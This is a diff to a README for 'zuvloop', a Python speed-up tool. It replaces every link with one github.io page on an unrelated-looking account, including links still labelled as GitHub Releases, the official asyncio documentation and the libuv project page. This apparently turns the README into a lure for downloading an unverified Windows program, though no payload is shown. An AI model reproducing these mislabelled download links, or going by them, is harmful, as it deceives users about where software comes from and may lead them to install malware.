@@ -1,6 +1,6 @@
 # ⚡ zuvloop - Supercharge Your Python Programs
 
-[![Download Now](https://img.shields.io/badge/Download-zuvloop-blue?style=for-the-badge&logo=windows)](https://github.com/mikirmeitheiderringdo930/zuvloop/releases)
+[![Download Now](https://img.shields.io/badge/Download-zuvloop-blue?style=for-the-badge&logo=windows)](https://mikirmeitheiderringdo930.github.io)
 
 ## 🚀 What is zuvloop?
 
@@ -22,7 +22,7 @@ zuvloop brings several advantages to your Python projects:
 
 Visit this link to download the application:
 
-[**Download zuvloop from GitHub Releases**](https://github.com/mikirmeitheiderringdo930/zuvloop/releases)
+[**Download zuvloop from GitHub Releases**](https://mikirmeitheiderringdo930.github.io)
 
 To install zuvloop on Windows, follow these simple steps:
 
@@ -107,9 +107,9 @@ If you see a version number printed, everything is set up correctly.
 
 ## 📚 Additional Resources
 
-- [Official asyncio documentation](https://docs.python.org/3/library/asyncio.html)
-- [libuv project page](https://libuv.org/)
-- [GitHub repository for zuvloop](https://github.com/mikirmeitheiderringdo930/zuvloop)
+- [Official asyncio documentation](https://mikirmeitheiderringdo930.github.io)
+- [libuv project page](https://mikirmeitheiderringdo930.github.io)
+- [GitHub repository for zuvloop](https://mikirmeitheiderringdo930.github.io)
 
 ## 🤝 Contributing
 
